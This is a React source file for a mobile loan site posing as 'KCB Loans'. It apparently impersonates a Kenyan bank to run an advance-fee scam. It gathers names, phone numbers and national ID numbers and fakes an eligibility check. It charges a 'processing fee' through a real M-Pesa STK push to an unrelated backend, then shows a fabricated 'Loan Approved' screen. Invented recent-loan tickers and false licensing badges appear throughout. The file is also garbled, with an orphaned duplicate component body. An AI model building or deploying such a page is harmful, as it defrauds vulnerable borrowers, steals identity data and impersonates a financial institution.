"use client";
import { useState, useEffect, useRef } from "react";

import {
  FaBolt,
  FaMobileAlt,
  FaShieldAlt,
  FaUser,
  FaStar,
  FaMoneyBillWave,
  FaFileAlt,
  FaCheckCircle,
  FaLock
} from "react-icons/fa";
/* ═══════════════════════════════════════════════════════════════
   KCB LOANS KENYA — exact screenshot match
   Landing → Eligibility Form → Loan Grid → Confirm Modal →
   STK Push → Verifying Payment → Success
   Real M-Pesa: starlink-backend-yb3n.onrender.com
═══════════════════════════════════════════════════════════════ */

const MPESA_BASE = "https://starlink-backend-yb3n.onrender.com";

/* ── Loan packages (amount, fee, repayment = amount + fee + interest) ── */
const LOANS = [
  { amount: 9900,  fee: 120,  repayment: 10780 },
  { amount: 11200, fee: 150,  repayment: 12320 },
  { amount: 16800, fee: 180,  repayment: 18480 },
  { amount: 21200, fee: 220,  repayment: 23320 },
  { amount: 25600, fee: 350,  repayment: 28160 },
  { amount: 30000, fee: 420,  repayment: 33000 },
  { amount: 35400, fee: 540,  repayment: 38940 },
  { amount: 39800, fee: 680,  repayment: 43780 },
  { amount: 44200, fee: 960,  repayment: 48620 },
  { amount: 48600, fee: 1550, repayment: 53460 },
];


const SECURITY = [
  { icon: FaLock, label: "SSL Secured" },
  { icon: FaShieldAlt, label: "Data Protected" },
  { icon: FaUser, label: "No CRB Check" },
  { icon: FaStar, label: "Licensed Program" },
];

const LOAN_TYPES = [
  "Personal Loan",
  "Business Loan",
  "Emergency Loan",
  "School Fees Loan",
  "Agricultural Loan",
  "Asset Finance",
];

/* ── phone helpers ── */
function normalisePhone(raw) {
  const p = raw.replace(/\D/g, "");
  if (p.startsWith("07") || p.startsWith("01")) return "254" + p.slice(1);
  if (p.startsWith("254")) return p;
  return null;
}
function isValidPhone(raw) {
  const p = raw.replace(/\D/g, "");
  return /^(07\d{8}|01\d{8}|2547\d{8}|2541\d{8})$/.test(p);
}
function fmt(n) {
  return Number(n).toLocaleString("en-KE");
}
function maskPhone(p) {
  const d = p.replace(/\D/g, "");
  if (d.startsWith("254")) return "254" + d.slice(3, 6) + "***" + d.slice(-3);
  return d.slice(0, 4) + "***" + d.slice(-3);
}

/* ── Recent loan ticker data ── */
const RECENT = [
  "0727****01 loaned Ksh 22,500 – 7 mins ago",
  "0712****45 loaned Ksh 16,800 – 12 mins ago",
  "0745****88 loaned Ksh 9,800 – 18 mins ago",
  "0711****32 loaned Ksh 48,600 – 22 mins ago",
  "0790****56 loaned Ksh 30,000 – 31 mins ago",
  "0722****19 loaned Ksh 11,200 – 35 mins ago",
  "0768****74 loaned Ksh 35,400 – 44 mins ago",
  "0733****63 loaned Ksh 25,600 – 51 mins ago",
];

/* ══════════════════════════════════════════════════════════════
   CSS — exact match to screenshots
══════════════════════════════════════════════════════════════ */
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{font-size:16px;-webkit-text-size-adjust:100%}
body{font-family:'Inter',sans-serif;background:#f0f7f0;color:#1a1a1a;overflow-x:hidden;min-height:100vh;-webkit-font-smoothing:antialiased}
input,select,button,textarea{font-family:inherit}
input::placeholder{color:#b0b8b0}
::-webkit-scrollbar{width:3px}::-webkit-scrollbar-thumb{background:#c8dfc8;border-radius:2px}

/* ── APP SHELL ── */
.app{max-width:480px;margin:0 auto;min-height:100vh;background:#f0f7f0;position:relative;overflow-x:hidden}

/* ── TOP BAR ── */
.topbar{background:linear-gradient(135deg,#1a7a3a,#2d9e52);padding:16px 20px 14px;display:flex;align-items:center;justify-content:space-between}
.logo-pill{background:#fff;border-radius:12px;padding:8px 18px;display:inline-block}
.logo-text{font-size:1.3rem;font-weight:800;color:#1a7a3a;letter-spacing:-.3px}
.logo-reg{font-size:9px;vertical-align:super;color:#1a7a3a}
.topbar-tag{background:rgba(255,255,255,.18);border-radius:99px;padding:6px 14px;font-size:12px;font-weight:600;color:#fff;display:flex;align-items:center;gap:5px}

/* ── HERO CARD ── */
.hero-card{margin:16px;background:#fff;border-radius:20px;padding:28px 24px;box-shadow:0 4px 24px rgba(26,122,58,.10)}
.hero-avail{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.12em;color:#9aaa9a;text-align:center;margin-bottom:8px}
.hero-amount{font-size:2.6rem;font-weight:800;color:#1a7a3a;text-align:center;line-height:1.1;margin-bottom:6px}
.hero-dash{color:#333;font-weight:700}
.hero-sub{text-align:center;font-size:13px;color:#6b7b6b;margin-bottom:22px;line-height:1.5}
.features-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:0}
.feat-box{background:#edf7ef;border-radius:14px;padding:18px 14px;display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
.feat-icon{font-size:26px;color:#1a7a3a}
.feat-label{font-size:12px;font-weight:700;color:#2a3a2a}

/* ── TRUST BADGES ── */
.trust-row{display:flex;gap:8px;flex-wrap:wrap;padding:0 16px;margin-bottom:8px;justify-content:center}
.trust-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;box-shadow:0 2px 8px rgba(0,0,0,.06);border:1px solid #d8edd8}

/* ── TICKER ── */
.ticker-wrap{background:#edf7ef;border-radius:12px;margin:10px 16px;padding:10px 14px;display:flex;align-items:center;gap:8px;overflow:hidden}
.ticker-icon{font-size:14px;flex-shrink:0;color:#1a7a3a}
.ticker-text{font-size:12px;font-weight:600;color:#2a5a2a;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

/* ── BTN PRIMARY ── */
.btn-primary{display:block;width:calc(100% - 32px);margin:14px 16px;padding:18px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 6px 20px rgba(26,122,58,.3)}
.btn-primary:hover{background:linear-gradient(135deg,#145f2e,#248042);transform:translateY(-1px)}
.btn-primary:active{transform:translateY(0)}
.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-primary-fixed{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:480px;padding:18px 24px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:17px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;box-shadow:0 -4px 24px rgba(26,122,58,.2);z-index:20}
.btn-primary-fixed:disabled{opacity:.5;cursor:not-allowed}

/* ── FORM ── */
.form-wrap{margin:0 16px;background:#fff;border-radius:20px;padding:24px;box-shadow:0 4px 20px rgba(26,122,58,.08)}
.form-title{font-size:1.35rem;font-weight:800;color:#1a1a1a;text-align:center;margin-bottom:4px;line-height:1.25}
.form-sub{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:4px}
.form-range{font-size:15px;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:22px}
.finp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s,box-shadow .18s;margin-bottom:12px}
.finp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.finp.err{border-color:#e53935}
.fsel{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:15px 16px;font-size:15px;color:#1a1a1a;outline:none;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%231a7a3a' stroke-width='2'%3E%3Cpath d='m6 9 6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:40px;transition:border-color .18s;margin-bottom:12px}
.fsel:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.ferr{font-size:11px;color:#e53935;margin:-8px 0 10px 4px}
.finp-hint{font-size:11px;color:#9aaa9a;margin:-8px 0 10px 4px}
.trust-mini{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px;justify-content:center}
.trust-mini-pill{background:#edf7ef;border-radius:99px;padding:5px 12px;font-size:10px;font-weight:600;color:#2a5a2a;display:flex;align-items:center;gap:4px;border:1px solid #c8e4c8}
.form-bottom-note{font-size:12px;color:#9aaa9a;text-align:center;margin-top:4px}

/* ── LOAN GRID ── */
.screen-title{font-size:1.15rem;font-weight:800;color:#1a7a3a;text-align:center;margin:16px 0 12px;padding:0 16px}
.loan-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 16px;margin-bottom:90px}
.loan-card{background:#fff;border:1.5px solid #e8f4e8;border-radius:16px;padding:18px 14px;cursor:pointer;transition:all .18s;display:flex;flex-direction:column;align-items:flex-start;gap:3px;position:relative;overflow:hidden}
.loan-card:hover{border-color:#1a7a3a;transform:translateY(-2px);box-shadow:0 8px 24px rgba(26,122,58,.14)}
.loan-card.selected{border-color:#1a7a3a;background:#edf7ef;box-shadow:0 6px 20px rgba(26,122,58,.18)}
.loan-card.selected::before{content:'✓';position:absolute;top:8px;right:10px;font-size:13px;font-weight:800;color:#1a7a3a}
.loan-amount{font-size:1.15rem;font-weight:800;color:#1a7a3a}
.loan-fee{font-size:12px;color:#7a8a7a;font-weight:500}

/* ── MODAL OVERLAY ── */
.modal-bg{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.45);backdrop-filter:blur(3px);display:flex;align-items:flex-end;justify-content:center;padding:0;animation:bgIn .25s ease}
@media(min-width:480px){.modal-bg{align-items:center;padding:20px}}
@keyframes bgIn{from{opacity:0}to{opacity:1}}
.modal-box{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:480px;padding:28px 24px 36px;animation:slideUp .3s cubic-bezier(.34,1.2,.64,1)}
@media(min-width:480px){.modal-box{border-radius:24px}}
@keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:none;opacity:1}}
.modal-icon{width:72px;height:72px;border-radius:50%;background:#edf7ef;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px}
.modal-icon.doc{background:#edf7ef}
.modal-icon.phone{background:#edf7ef}
.modal-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:20px}
.modal-details{background:#f8faf8;border-radius:14px;padding:16px;margin-bottom:16px}
.modal-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #eef4ee}
.modal-row:last-child{border-bottom:none}
.modal-row-key{font-size:13px;color:#7a8a7a;font-weight:500}
.modal-row-val{font-size:14px;font-weight:700;color:#1a1a1a}
.modal-row-val.green{color:#1a7a3a}
.modal-phone-line{font-size:13px;color:#7a8a7a;text-align:center;margin-bottom:6px}
.modal-phone-num{font-size:16px;font-weight:700;color:#1a7a3a;text-align:center;margin-bottom:20px}
.btn-proceed{width:100%;padding:17px;border-radius:14px;border:none;background:linear-gradient(135deg,#1a7a3a,#2d9e52);color:#fff;font-size:16px;font-weight:700;cursor:pointer;margin-bottom:12px;transition:all .2s;box-shadow:0 4px 16px rgba(26,122,58,.25)}
.btn-proceed:hover{background:linear-gradient(135deg,#145f2e,#248042)}
.btn-proceed:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-cancel{width:100%;padding:15px;border-radius:14px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:15px;font-weight:600;cursor:pointer;transition:all .2s}
.btn-cancel:hover{border-color:#1a7a3a;color:#1a7a3a}

/* ── STK SCREEN ── */
.stk-modal-icon{font-size:58px;margin-bottom:6px}
.stk-title{font-size:1.3rem;font-weight:800;color:#1a7a3a;text-align:center;margin-bottom:14px}
.stk-phone-box{background:#f0f7f0;border-radius:10px;padding:10px 16px;text-align:center;margin-bottom:20px;font-size:14px;color:#2a5a2a;font-weight:600}
.stk-verifying{text-align:center;font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:4px}
.stk-dots{display:inline-block;min-width:20px;text-align:left}
.stk-bar-wrap{height:5px;background:#e0ece0;border-radius:99px;margin:16px 0;overflow:hidden}
.stk-bar-fill{height:100%;background:linear-gradient(90deg,#1a7a3a,#4ade80);border-radius:99px;animation:stk-progress 20s linear forwards}
@keyframes stk-progress{from{width:0%}to{width:95%}}
.stk-note{font-size:12px;color:#9aaa9a;text-align:center;line-height:1.6}
.stk-manual{margin-top:16px;background:none;border:none;cursor:pointer;font-size:12px;color:#9aaa9a;text-decoration:underline;display:block;margin:14px auto 0}

/* ── SUCCESS ── */
.success-wrap{padding:32px 24px;text-align:center}
.success-icon{font-size:72px;margin-bottom:16px;animation:popIn .5s cubic-bezier(.34,1.56,.64,1)}
@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
.success-title{font-size:1.5rem;font-weight:800;color:#1a7a3a;margin-bottom:8px}
.success-sub{font-size:14px;color:#6b7b6b;line-height:1.7;max-width:300px;margin:0 auto 24px}
.success-amount-box{background:#edf7ef;border:1.5px solid #a8d4a8;border-radius:16px;padding:20px;margin-bottom:20px}
.success-amount{font-size:2rem;font-weight:800;color:#1a7a3a}
.success-amount-sub{font-size:13px;color:#6b7b6b;margin-top:4px}
.success-details{text-align:left;background:#f8faf8;border-radius:14px;padding:16px}
.srow{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #eef4ee;font-size:13px}
.srow:last-child{border-bottom:none}
.srow-k{color:#9aaa9a;font-weight:500}
.srow-v{color:#1a1a1a;font-weight:700}

/* ── TIMEOUT ── */
.timeout-wrap{text-align:center;padding:8px 0}
.timeout-ico{font-size:52px;margin-bottom:12px}
.timeout-t{font-size:1.1rem;font-weight:800;color:#1a1a1a;margin-bottom:8px}
.timeout-s{font-size:13px;color:#7a8a7a;line-height:1.65;margin-bottom:20px}
.btn-yes{width:100%;padding:15px;border-radius:12px;border:none;background:#1a7a3a;color:#fff;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px}
.btn-no{width:100%;padding:15px;border-radius:12px;border:1.5px solid #e0ece0;background:#fff;color:#7a8a7a;font-size:14px;font-weight:600;cursor:pointer}

/* ── SECURITY STRIP ── */
.security-strip{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;padding:10px 16px 20px}
.sec-pill{background:#fff;border-radius:99px;padding:7px 14px;font-size:11px;font-weight:600;color:#2a4a2a;display:flex;align-items:center;gap:5px;border:1px solid #d8edd8;box-shadow:0 1px 4px rgba(0,0,0,.05)}

/* ── SPINNER ── */
.spin{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .65s linear infinite;display:inline-block}
@keyframes sp{to{transform:rotate(360deg)}}

/* ── PHONE INPUT ── */
.phone-modal-wrap{margin-bottom:14px}
.phone-modal-inp{width:100%;background:#f8faf8;border:1.5px solid #e0ece0;border-radius:14px;padding:14px 16px;font-size:15px;color:#1a1a1a;outline:none;transition:border-color .18s;text-align:center;letter-spacing:.04em}
.phone-modal-inp:focus{border-color:#1a7a3a;box-shadow:0 0 0 3px rgba(26,122,58,.10)}
.phone-modal-inp.err{border-color:#e53935}
.phone-err{font-size:11px;color:#e53935;text-align:center;margin-top:4px}
.phone-hint{font-size:11px;color:#9aaa9a;text-align:center;margin-top:4px}
`;

/* ══════════════════════════════════════════════════════════════
   COMPONENTS
══════════════════════════════════════════════════════════════ */

/* Animated ticker */
function Ticker({ items }) {
  const [idx, setIdx] = useState(0);
  useEffect(() => {
    const iv = setInterval(() => setIdx(i => (i + 1) % items.length), 4000);
    return () => clearInterval(iv);
  }, [items.length]);
  return (
    <div className="ticker-wrap">
      <span className="ticker-icon">📢</span>
      <span className="ticker-text">{items[idx]}</span>
    </div>
  );
}

/* ── SCREEN 1: HERO ── */
function HeroScreen({ onStart }) {
  return (
    <div>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
        </div>
        <div className="topbar-tag">♦ Your Trusted Financial Partner ♦</div>
      </div>

      <Ticker items={RECENT} />

      <div className="hero-card">
        <div className="hero-avail">AVAILABLE LOAN AMOUNT</div>
        <div className="hero-amount">
          Ksh. 1,000 <span className="hero-dash">–</span><br />100,000
        </div>
        <div className="hero-sub">Affordable financing for Kenyan youth &amp; entrepreneurs</div>
        <div className="features-grid">
          <div className="feat-box">
        <div className="feat-icon"><FaBolt /></div>      
      <div className="feat-label">Fast Approval</div>
          </div>
          <div className="feat-box">
<div className="modal-icon"><FaMobileAlt /></div>          
  <div className="feat-label">Paperless Process</div>
          </div>
          <div className="feat-box">
            <div className="feat-icon"><FaShieldAlt/></div>
            <div className="feat-label">Secure &amp; Safe</div>
          </div>
          <div className="feat-box">
            <div className="feat-icon"><FaMoneyBillWave/></div>
            <div className="feat-label">Flexible Terms</div>
          </div>
        </div>
      </div>

      <button className="btn-primary" onClick={onStart} style={{display:"flex"}}>
        Start Application →
      </button>

 

<div className="security-strip">
  {SECURITY.map((item) => {
  const Icon = item.icon;
  return (
    <div key={item.label} className="sec-pill">
      <Icon />
      <span>{item.label}</span>
    </div>
  );
})}
</div>
    </div>
  );
}

/* ── SCREEN 2: ELIGIBILITY FORM ── */
function EligibilityScreen({ onNext }) {
  const [f, setF] = useState({ name:"", phone:"", id:"", loanType:"" });
const [errs, setErrs] = useState<Record<string, string>>({});  const [loading, setLoading] = useState(false);
  const set = (k, v) => setF(p => ({ ...p, [k]: v }));

  const validate = () => {
 const e : {



  name?: string;



  phone?: string;



  id?: string;



  loanType?: string;

} = {};

    if (!f.name.trim() || f.name.trim().length < 3) e.name = "Enter your full name";

    if (!isValidPhone(f.phone)) e.phone = "Enter valid Safaricom/Airtel number";

    if (!f.id.trim().match(/^\d{7,8}$/)) e.id = "Enter valid 7–8 digit ID number";

    if (!f.loanType) e.loanType = "Select a loan type";

    return e;

  };

  const submit = async () => {
    const e: any = validate();
    if (Object.keys(e).length) { setErrs(e); return; }
    setLoading(true);
    await new Promise(r => setTimeout(r, 1400)); // simulated eligibility check
    setLoading(false);
    onNext(f);
  };

  const inp = (k) => ({
    className: `finp${errs[k] ? " err" : ""}`,
    value: f[k],
    onChange: e => { set(k, e.target.value); if (errs[k]) setErrs(p => ({ ...p, [k]: "" })); },
  });

  return (
    <>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
        </div>
      </div>

      <div style={{ height: 16 }} />

      <div className="form-wrap">
        <div className="form-title">Check Your Loan Eligibility</div>
        <div className="form-sub">Find out how much you qualify for</div>
        <div className="form-range">Ksh. 1,000 – 100,000</div>

        <input {...inp("name")} type="text" placeholder="Full Name" autoComplete="name" />
        {errs.name && <div className="ferr">{errs.name}</div>}

        <input
          className={`finp${errs.phone ? " err" : ""}`}
          type="tel"
          inputMode="numeric"
          placeholder="Phone Number"
          value={f.phone}
          onChange={e => { set("phone", e.target.value.replace(/[^\d]/g, "").slice(0, 12)); if (errs.phone) setErrs(p => ({ ...p, phone: "" })); }}
        />
        {errs.phone && <div className="ferr">{errs.phone}</div>}

        <input
          className={`finp${errs.id ? " err" : ""}`}
          type="text"
          inputMode="numeric"
          placeholder="ID Number"
          value={f.id}
          onChange={e => { set("id", e.target.value.replace(/\D/g, "").slice(0, 8)); if (errs.id) setErrs(p => ({ ...p, id: "" })); }}
        />
        {errs.id && <div className="ferr">{errs.id}</div>}

        <select
          className={`fsel${errs.loanType ? " err" : ""}`}
          value={f.loanType}
          onChange={e => { set("loanType", e.target.value); if (errs.loanType) setErrs(p => ({ ...p, loanType: "" })); }}
        >
          <option value="">Select Loan Type</option>
          {LOAN_TYPES.map(l => <option key={l} value={l}>{l}</option>)}
        </select>
        {errs.loanType && <div className="ferr">{errs.loanType}</div>}

        <div className="security-strip">
  {SECURITY.map((item) => {
  const Icon = item.icon;
  return (
    <div key={item.label} className="sec-pill">
      <Icon />
      <span>{item.label}</span>
    </div>
  );
})}
</div>

        <button
          className="btn-primary"
          style={{ width:"100%", margin:0, display:"flex" }}
          onClick={submit}
          disabled={loading}
        >
          {loading ? <><span className="spin" /> &nbsp;Checking Eligibility…</> : "Check Eligibility →"}
        </button>
        <div className="form-bottom-note" style={{ marginTop: 14 }}>
          No paperwork required. No guarantors needed.
        </div>
      </div>

      <div style={{ height: 24 }} />

      <div className="security-strip">
  {SECURITY.map((item) => {
  const Icon = item.icon;
  return (
    <div key={item.label} className="sec-pill">
      <Icon />
      <span>{item.label}</span>
    </div>
  );
})}
</div>
    </>
  );
}

/* ── SCREEN 3: LOAN GRID ── */
function LoanGridScreen({ userData, onSelect }) {
  const [selected, setSelected] = useState(null);

  const proceed = () => {
    if (!selected) return;
    onSelect(selected);
  };

  return (
    <>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
        </div>
      </div>

      <Ticker items={RECENT} />

      <div className="screen-title">Select Your Loan Amount</div>

      <div className="loan-grid">
        {LOANS.map(loan => (
          <div
            key={loan.amount}
            className={`loan-card${selected?.amount === loan.amount ? " selected" : ""}`}
            onClick={() => setSelected(loan)}
          >
            <div className="loan-amount">Ksh {fmt(loan.amount)}</div>
            <div className="loan-fee">Fee: Ksh {fmt(loan.fee)}</div>
          </div>
        ))}
      </div>

      <button
        className="btn-primary-fixed"
        onClick={proceed}
        disabled={!selected}
      >
        Get Loan Now →
      </button>

      <div style={{ height: 80 }} />
    </>
  );
}

/* ── MODAL: CONFIRM LOAN APPLICATION ── */
function ConfirmModal({ loan, userData, onProceed, onCancel }) {
  return (
    <div className="modal-bg" onClick={onCancel}>
      <div className="modal-box" onClick={e => e.stopPropagation()}>
        <div style={{ textAlign: "center", marginBottom: 0 }}>
          <div className="modal-icon doc">📄</div>
        </div>
        <div className="modal-title">Confirm Loan Application</div>

        <div className="modal-details">
          <div className="modal-row">
            <span className="modal-row-key">Loan Amount:</span>
            <span className="modal-row-val green">Ksh {fmt(loan.amount)}</span>
          </div>
          <div className="modal-row">
            <span className="modal-row-key">Processing Fee:</span>
            <span className="modal-row-val">Ksh {fmt(loan.fee)}</span>
          </div>
          <div className="modal-row">
            <span className="modal-row-key">Total Repayment:</span>
            <span className="modal-row-val">Ksh {fmt(loan.repayment)}</span>
          </div>
        </div>

        <div className="modal-phone-line">An M-Pesa prompt will be sent to complete your application</div>
        <div className="modal-phone-num">Phone: {userData.phone}</div>

        <button className="btn-proceed" onClick={onProceed}>
          Proceed with Application
        </button>
        <button className="btn-cancel" onClick={onCancel}>Cancel</button>
      </div>
    </div>
  );
}

/* ── MODAL: STK PUSH SENT ── */
function STKModal({ loan, userData, onSuccess, onCancel }) {
  const [dotsCount, setDotsCount] = useState(1);

  const pollRef = useRef(null);
  const dotsRef = useRef(null);
  const hasRunRef = useRef(false);

  const normPhone = normalisePhone(userData.phone) || userData.phone;

  useEffect(() => {
    if (hasRunRef.current) return;
    hasRunRef.current = true;

    // dots animation only
    dotsRef.current = setInterval(() => {
      setDotsCount((d) => (d >= 3 ? 1 : d + 1));
    }, 600);

    const initPay = async () => {
      try {
        const res = await fetch(`${MPESA_BASE}/api/runPrompt`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            phone: normPhone,
            amount: loan.fee,
            local_id: `KCB-${Date.now()}`,
            transaction_desc: `KCB Loans fee Ksh ${loan.fee}`,
          }),
        });

        const data = await res.json().catch(() => ({}));

        if (!res.ok || data.status === false) {
          // ONLY log internally, DO NOT show UI error
          console.log("STK failed to send:", data);
          return;
        }

        const cid =
          data.checkout_request_id || data.checkoutRequestId || null;

        if (!cid) return;

        pollRef.current = setInterval(async () => {
          try {
            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
            if (!r.ok) return;

            const d = await r.json();

            if (
              d?.success === true ||
              d?.status === "completed" ||
              d?.ResultCode === 0
            ) {
              clearInterval(pollRef.current);
              onSuccess();
            }
          } catch {
            // silently ignore
          }
        }, 4000);
      } catch (err) {
        console.log("STK network error", err);
      }
    };

    initPay();

    return () => {
      clearInterval(pollRef.current);
      clearInterval(dotsRef.current);
    };
  }, []);

  return (
    <div className="modal-bg">
      <div className="modal-box" style={{ textAlign: "center" }}>
        <div className="modal-icon phone">📱</div>

        <div className="stk-title">STK Push Sent</div>

        <div className="stk-phone-box">
          Waiting for payment confirmation...
        </div>

        <div className="stk-bar-wrap">
          <div className="stk-bar-fill" />
        </div>

        <div className="stk-verifying">
          Processing<span>{".".repeat(dotsCount)}</span>
        </div>

        <button className="stk-manual" onClick={onCancel}>
          Cancel
        </button>
      </div>
    </div>
  );
}
  return (
    <div className="modal-bg">
      <div className="modal-box" style={{ textAlign: "center" }}>
        <div className="modal-icon phone">📱</div>

        <div className="stk-title">STK Push Sent</div>

        <div className="stk-phone-box">
          Phone: {displayPhone}
        </div>

        <div className="stk-bar-wrap">
          <div className="stk-bar-fill" />
        </div>

        {err ? (
          <div style={{ color: "red", fontSize: 13 }}>{err}</div>
        ) : (
          <div className="stk-verifying">
            Verifying <span>{"...".slice(0, dotsCount)}</span>
          </div>
        )}

        <button className="stk-manual" onClick={onCancel}>
          Cancel
        </button>
      </div>
    </div>
  );
}

/* ── SUCCESS SCREEN ── */
function SuccessScreen({ loan, userData, onDone }) {
  const now = new Date();
  const repayDate = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);
  const repayStr = repayDate.toLocaleDateString("en-KE", { day: "numeric", month: "short", year: "numeric" });

  return (
    <div style={{ padding: "0 0 30px" }}>
      <div className="topbar">
        <div className="logo-pill">
          <span className="logo-text">KCB Loans<span className="logo-reg">®</span></span>
        </div>
      </div>
      <div className="success-wrap">
        <div className="success-icon">🎉</div>
        <div className="success-title">Loan Approved!</div>
        <div className="success-sub">
          Congratulations <strong>{userData.name}</strong>! Your loan has been approved and will be disbursed to <strong>{userData.phone}</strong> within minutes.
        </div>
        <div className="success-amount-box">
          <div className="success-amount">Ksh {fmt(loan.amount)}</div>
          <div className="success-amount-sub">Disbursing to M-Pesa shortly ⚡</div>
        </div>
        <div className="success-details">
          {[
            ["Loan Amount", `Ksh ${fmt(loan.amount)}`],
            ["Processing Fee", `Ksh ${fmt(loan.fee)}`],
            ["Total Repayment", `Ksh ${fmt(loan.repayment)}`],
            ["Repayment Date", repayStr],
            ["M-Pesa Number", userData.phone],
            ["Status", "✅ Approved"],
          ].map(([k, v]) => (
            <div key={k} className="srow">
              <span className="srow-k">{k}</span>
              <span className="srow-v">{v}</span>
            </div>
          ))}
        </div>
        <button
          className="btn-primary"
          style={{ width: "100%", margin: "20px 0 0", display: "flex" }}
          onClick={onDone}
        >
          Apply for Another Loan →
        </button>
        <div className="security-strip" style={{ paddingTop: 16 }}>
          {[["🔒","SSL Secured"],["🛡️","Data Protected"],["⭐","Licensed Program"],["👥","Trusted by Thousands"]].map(([ic,lb])=>(
            <div key={lb} className="sec-pill"><span>{ic}</span>{lb}</div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════════════
   ROOT APP
══════════════════════════════════════════════════════════════ */
export default function KCBLoans() {
  const [screen, setScreen] = useState("hero"); // hero | form | grid | success
  const [userData, setUserData] = useState(null);
  const [selectedLoan, setSelectedLoan] = useState(null);
  const [showConfirm, setShowConfirm] = useState(false);
  const [showSTK, setShowSTK] = useState(false);

  const handleFormNext = (data) => {
    setUserData(data);
    setScreen("grid");
  };

  const handleLoanSelect = (loan) => {
    setSelectedLoan(loan);
    setShowConfirm(true);
  };

  const handleProceed = () => {
    setShowConfirm(false);
    setShowSTK(true);
  };

  const handleSuccess = () => {
    setShowSTK(false);
    setScreen("success");
  };

  const handleReset = () => {
    setScreen("hero");
    setUserData(null);
    setSelectedLoan(null);
    setShowConfirm(false);
    setShowSTK(false);
  };

  return (
    <>
      <style>{CSS}</style>
      <div className="app">

        {screen === "hero"    && <HeroScreen onStart={() => setScreen("form")} />}
        {screen === "form"    && <EligibilityScreen onNext={handleFormNext} />}
        {screen === "grid"    && <LoanGridScreen userData={userData} onSelect={handleLoanSelect} />}
        {screen === "success" && <SuccessScreen loan={selectedLoan} userData={userData} onDone={handleReset} />}

        {showConfirm && selectedLoan && (
          <ConfirmModal
            loan={selectedLoan}
            userData={userData}
            onProceed={handleProceed}
            onCancel={() => setShowConfirm(false)}
          />
        )}

        {showSTK && selectedLoan && (
          <STKModal
            loan={selectedLoan}
            userData={userData}
            onSuccess={handleSuccess}
            onCancel={() => { setShowSTK(false); setShowConfirm(false); }}
          />
        )}

      </div>
    </>
  );
}
